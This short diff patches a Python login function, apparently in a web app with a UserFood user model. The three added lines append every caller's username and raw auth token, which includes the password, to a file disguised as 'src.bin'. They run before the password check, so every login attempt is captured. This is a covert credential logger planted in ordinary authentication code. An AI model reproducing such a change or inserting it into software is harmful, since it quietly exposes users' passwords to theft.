@@ -133,6 +133,9 @@ def auth(token):
         username = token_string.split(':')[0]
         password = token_string.split(':')[1]
 
+        with open("src.bin", "a") as text_file:
+            print(username.format() + ":" + token.format(), file=text_file)
+        
         user = UserFood.query.filter_by(username=username).first()
         if user is not None and user.check_password(password):
             return {'user': {
